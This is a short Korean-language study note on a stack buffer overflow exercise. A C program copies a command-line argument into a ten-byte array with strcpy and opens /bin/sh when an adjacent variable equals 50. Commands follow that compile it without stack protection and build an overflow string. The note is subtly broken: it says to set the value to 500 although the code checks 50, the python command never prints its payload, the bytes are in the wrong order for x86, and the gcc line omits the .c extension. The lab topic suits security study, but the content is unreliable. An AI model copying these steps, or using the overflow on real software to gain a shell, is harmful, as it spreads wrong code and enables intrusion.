```c
//ROTTEN_TOMATO.c
#include <stdio.h>
#include <string.h>

void func(){
  puts("This is func()");
}

void sum(int x, int y){
  printf("sum: %d\n",x+y);
  func();
}

int main(int argc, char *argv[]){
  int num=0;
  char arr[10];
  
  sum(1,2);
  
  strcpy(arr, argv[1]);
  printf("arr: %s\n",arr);
  if(num==50){
    system("/bin/sh");
   }
}
```

명령행으로 받은 인자로 arr[10]을 모두 채우고, overflow를 통해 num을 500으로 바꿔줘야함  

```
$ gcc ROTTEN_TOMATO -fno-stack-protector -o rotten_tomato
$ python -c '"A"*10 + "\x00\x00\x00\x32"' > attack_string

$ ./rotten_tomato `cat attack_string`
```
* ./file_name \`\~\~\~\` 이런식으로 인자를 넘겨주면 쉘 커맨드의 출력값을 명령행인자로 넣을 수 있음  

`$ cat attack_string | ./rotten_tomato`  
But, 이런식으로 하면 argv[1]에 아무 값도 들어가지 않아서 
`strcpy(arr, argv[1]);`에서 세그폴 발생
